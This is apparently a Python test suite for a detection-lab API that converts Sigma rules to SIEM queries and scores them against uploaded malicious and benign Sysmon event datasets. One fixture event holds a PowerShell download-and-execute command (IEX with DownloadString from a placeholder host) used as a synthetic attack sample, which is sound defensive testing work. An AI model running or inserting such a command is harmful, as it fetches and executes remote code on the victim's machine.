import json

import pytest

from app.api.endpoints import detection_lab, parser
from app.schemas.cir import CIRSpecification

SYSMON = "Microsoft-Windows-Sysmon/Operational"
ATTACK_EVENTS = [
    {"EventID": 1, "Channel": SYSMON, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "CommandLine": "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://x')"},
    {"EventID": 3, "Channel": SYSMON, "Image": "C:\\x.exe", "DestinationIp": "10.0.0.5"},
]
BASELINE_EVENTS = [
    {"EventID": 1, "Channel": SYSMON, "Image": "C:\\Windows\\notepad.exe", "CommandLine": "notepad a.txt"},
]
CIR = {
    "scenario_id": "lab",
    "attack_graph": {"nodes": [{
        "step_id": "s1", "tactic": "TA0002", "technique": "T1059.001", "target": "WS01", "action_type": "Execution",
        "evidence": [{"type": "process", "image": "powershell.exe", "command_line": "DownloadString"}],
    }], "edges": []},
}
CUSTOM_RULE = """title: Notepad
logsource: {category: process_creation, product: windows}
detection:
  selection: {Image|endswith: '\\\\notepad.exe'}
  condition: selection
tags: [attack.t1204.002]
"""


def upload(client, headers, name, label, events, techniques=""):
    return client.post(
        "/api/v1/detection/datasets",
        data={"name": name, "label": label, "technique_ids": techniques},
        files={"file": (f"{name}.jsonl", "\n".join(json.dumps(e) for e in events), "application/json")},
        headers=headers,
    )


@pytest.fixture()
def lab(api_client, make_user, monkeypatch):
    async def fake_llm(_):
        return CIRSpecification(**CIR)

    monkeypatch.setattr(parser, "parse_narrative_to_cir", fake_llm)
    alice = make_user("alice")
    scenario_id = api_client.post("/api/v1/parse", json={"scenario": "ps"}, headers=alice).json()["id"]
    attack = upload(api_client, alice, "otrf-psh", "malicious", ATTACK_EVENTS, "T1059.001")
    baseline = upload(api_client, alice, "baseline", "benign", BASELINE_EVENTS)
    assert attack.status_code == baseline.status_code == 201, (attack.text, baseline.text)
    return alice, scenario_id, attack.json()["id"], baseline.json()["id"]


def test_targets_and_scenario_conversion(api_client, lab):
    alice, scenario_id, *_ = lab
    keys = [t["key"] for t in api_client.get("/api/v1/detection/targets", headers=alice).json()]
    assert keys == ["splunk", "kql", "elastic", "wazuh"]
    for target in keys:
        response = api_client.get(f"/api/v1/detection/convert/{target}/{scenario_id}", headers=alice)
        assert response.status_code == 200, response.text
        body = response.json()
        assert body["rules"] and all(rule["queries"] for rule in body["rules"]), body
        assert "title:" in body["sigma"]
    assert api_client.get(f"/api/v1/detection/convert/qradar/{scenario_id}", headers=alice).status_code == 400


def test_custom_sigma_conversion_reports_bad_yaml(api_client, lab):
    alice, *_ = lab
    ok = api_client.post("/api/v1/detection/convert/splunk", json={"sigma": CUSTOM_RULE}, headers=alice)
    assert ok.status_code == 200 and "notepad.exe" in ok.json()["rules"][0]["queries"][0]
    bad = api_client.post("/api/v1/detection/convert/splunk", json={"sigma": "title: [x"}, headers=alice)
    assert bad.status_code == 400


def test_evaluate_scenario_rules_against_datasets(api_client, lab):
    alice, scenario_id, attack_id, baseline_id = lab
    response = api_client.post(
        "/api/v1/detection/evaluate",
        json={"scenario_id": scenario_id, "dataset_ids": [attack_id, baseline_id]},
        headers=alice,
    )
    assert response.status_code == 200, response.text
    report = response.json()
    assert report["summary"]["dataset_recall"] == 1.0
    assert report["summary"]["benign_alerts"] == 0
    assert report["summary"]["alert_precision"] == 1.0
    assert report["rules"][0]["datasets"][0]["samples"][0]["CommandLine"].startswith("powershell")


def test_evaluate_custom_rule_counts_false_positives(api_client, lab):
    alice, _, attack_id, baseline_id = lab
    report = api_client.post(
        "/api/v1/detection/evaluate",
        json={"sigma": CUSTOM_RULE, "dataset_ids": [attack_id, baseline_id]},
        headers=alice,
    ).json()
    assert report["summary"]["benign_alerts"] == 1
    assert report["summary"]["detected_malicious_datasets"] == 0


def test_evaluate_requires_exactly_one_rule_source(api_client, lab):
    alice, scenario_id, attack_id, _ = lab
    both = {"sigma": CUSTOM_RULE, "scenario_id": scenario_id, "dataset_ids": [attack_id]}
    assert api_client.post("/api/v1/detection/evaluate", json=both, headers=alice).status_code == 400
    assert api_client.post("/api/v1/detection/evaluate", json={"dataset_ids": [attack_id]}, headers=alice).status_code == 400


def test_datasets_are_private(api_client, make_user, lab):
    alice, scenario_id, attack_id, _ = lab
    mallory = make_user("mallory")
    assert api_client.get("/api/v1/detection/datasets", headers=mallory).json() == []
    assert api_client.delete(f"/api/v1/detection/datasets/{attack_id}", headers=mallory).status_code == 404
    stolen = api_client.post("/api/v1/detection/evaluate", json={"sigma": CUSTOM_RULE, "dataset_ids": [attack_id]}, headers=mallory)
    assert stolen.status_code == 404
    other_scenario = api_client.post(
        "/api/v1/detection/evaluate", json={"scenario_id": scenario_id, "dataset_ids": [attack_id]}, headers=mallory
    )
    assert other_scenario.status_code == 404
    assert api_client.get(f"/api/v1/detection/convert/splunk/{scenario_id}", headers=mallory).status_code == 404
    assert len(api_client.get("/api/v1/detection/datasets", headers=alice).json()) == 2
    assert api_client.delete(f"/api/v1/detection/datasets/{attack_id}", headers=alice).status_code == 200


def test_upload_validation(api_client, lab, monkeypatch):
    alice, *_ = lab
    assert upload(api_client, alice, "x", "malicious", ATTACK_EVENTS, "T1059.001,NOPE").status_code == 400
    assert upload(api_client, alice, "x", "suspicious", ATTACK_EVENTS).status_code == 422
    bad = api_client.post(
        "/api/v1/detection/datasets",
        data={"name": "x", "label": "benign"},
        files={"file": ("x.json", b"   ", "application/json")},
        headers=alice,
    )
    assert bad.status_code == 400 and "No events" in bad.json()["detail"]
    monkeypatch.setattr(detection_lab, "MAX_UPLOAD_BYTES", 10)
    assert upload(api_client, alice, "big", "benign", BASELINE_EVENTS).status_code == 413


def test_evaluation_event_cap(api_client, lab, monkeypatch):
    alice, scenario_id, attack_id, baseline_id = lab
    monkeypatch.setattr(detection_lab, "MAX_EVENTS_PER_EVALUATION", 2)
    response = api_client.post(
        "/api/v1/detection/evaluate", json={"scenario_id": scenario_id, "dataset_ids": [attack_id, baseline_id]}, headers=alice
    )
    assert response.status_code == 400 and "at most 2" in response.json()["detail"]


def test_oversized_request_body_is_rejected_before_parsing(api_client, lab):
    from app.core.request_limits import DEFAULT_MAX_BODY_BYTES

    alice, *_ = lab
    response = api_client.post(
        "/api/v1/detection/datasets",
        content=b"x" * 10,
        headers={**alice, "Content-Type": "multipart/form-data; boundary=x", "Content-Length": str(DEFAULT_MAX_BODY_BYTES + 1)},
    )
    assert response.status_code == 413


def test_streamed_body_over_limit_is_rejected():
    import asyncio

    from app.core.request_limits import BodySizeLimitMiddleware

    async def app(scope, receive, send):
        while (await receive()).get("more_body"):
            pass
        await send({"type": "http.response.start", "status": 200, "headers": []})
        await send({"type": "http.response.body", "body": b"ok"})

    chunks = [{"type": "http.request", "body": b"a" * 6, "more_body": True}, {"type": "http.request", "body": b"a" * 6, "more_body": False}]
    sent = []

    async def receive():
        return chunks.pop(0)

    async def send(message):
        sent.append(message)

    asyncio.run(BodySizeLimitMiddleware(app, max_bytes=10)({"type": "http", "headers": []}, receive, send))
    assert sent[0]["status"] == 413
